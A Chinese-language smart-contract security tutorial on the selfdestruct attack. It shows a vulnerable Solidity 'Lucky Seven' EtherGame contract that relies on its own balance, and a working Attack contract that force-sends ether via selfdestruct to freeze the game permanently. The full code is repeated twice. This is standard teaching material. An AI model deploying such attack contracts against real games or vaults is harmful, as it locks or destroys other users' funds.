## 自毁函数攻击

* https://www.bilibili.com/video/BV19B4y1G7xW/
```go
selfdestruct合约在自毁后会执行：
1.余额转给指定地址
2.存储和代码在链上被移除
通常转账可用send(), transfer(), call()，但selfdestruct也可以

EVM支持142个指令 
	https://github.com/ethereum/go-ethereum/blob/master/core/vm/opcodes.go
	
selfdestruct():
	https://github.com/ethereum/go-ethereum/blob/master/core/vm/instructions.go
	
	interpreter.evm.StateDB.AddBalance(beneficiary.Bytes20(), balance)//transfer ether
	interpreter.evm.StateDB.SelfDestruct(scope.Contract.Address()) //self destruct
	
```
* Lucky Seven Game
```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.6.12 <0.9.0;

contract EtherGame{ //每轮需要玩家存入的总目标金额


	uint private constant TARGET_AMOUNT = 7 ether;
	address public winner;	//赢家地址

  function deposit() public payable{
  	require(msg.value== 1 ether, "you can only send 1 Ether");//判断玩家只能存入1个Ether
  	uint balance = address(this).balance; //当前合约余额
  	require(balance<=TARGET_AMOUNT, "game is over");//如果合约余额小于7个Ether继续，否则本轮终止
  	if(balance == TARGET_AMOUNT){//如果合约余额等于7 Ether，那么本轮存入玩家就是winner
  		winner = msg.sender;
  	}
  	//后面代码，如果合约余额不等于7，那么本次存入的玩家就是loser，ether被没收
  }
  
  function claimReward() public{ //判断是否为赢家，输家调用则返回not winner
  	require(msg.sender == winner, "not winner");
  	//给赢家发送合约中全部ether
  	(bool sent,) = msg.sender.call{value: address(this).balance}("");
  	require(sent, "failed to send Ether");
  	winner = address(0); //赢家地址清零
  }


  //查看合约余额
  function getBalance() public view returns(uint){
  	return address(this).balance;
  }
}
```
* 攻击思路：
```
1.绕开deposit函数，游戏一开始就存入7个Ether，这样由于
require(balance<=TARGET_AMOUNT, "game is over"); 
balance 8个Ether
balance 8 > Target Amount 7, 所以永远不会有赢家，也没人可以继续存入，余额也不会清零
```
* 攻击合约
```solidity
contract Attack{
	constructor() payable{
	}
	function attack(address _addr) external{ //攻击函数，参数为目标合约地址
		selfdestruct(payable(_addr));//自毁函数，强制转账给目标合约
	}

	function getBalnce() public view returns(uint){
		return address(this).balance;
	}

```
## 完整代码
```
// SPDX-License-Identifier: MIT
pragma solidity >=0.6.12 <0.9.0;

contract EtherGame{ //每轮需要玩家存入的总目标金额


	uint private constant TARGET_AMOUNT = 7 ether;
	address public winner;	//赢家地址

  function deposit() public payable{
  	require(msg.value== 1 ether, "you can only send 1 Ether");//判断玩家只能存入1个Ether
  	uint balance = address(this).balance; //当前合约余额
  	require(balance<=TARGET_AMOUNT, "game is over");//如果合约余额小于7个Ether继续，否则本轮终止
  	if(balance == TARGET_AMOUNT){//如果合约余额等于7 Ether，那么本轮存入玩家就是winner
  		winner = msg.sender;
  	}
  	//后面代码，如果合约余额不等于7，那么本次存入的玩家就是loser，ether被没收
  }
  
  function claimReward() public{ //判断是否为赢家，输家调用则返回not winner
  	require(msg.sender == winner, "not winner");
  	//给赢家发送合约中全部ether
  	(bool sent,) = msg.sender.call{value: address(this).balance}("");
  	require(sent, "failed to send Ether");
  	winner = address(0); //赢家地址清零
  }


  //查看合约余额
  function getBalance() public view returns(uint){
  	return address(this).balance;
  }
}

contract Attack{
	constructor() payable{
	}
	function attack(address _addr) external{ //攻击函数，参数为目标合约地址
		selfdestruct(payable(_addr));//自毁函数，强制转账给目标合约
	}

	function getBalnce() public view returns(uint){
		return address(this).balance;
	}
}
```
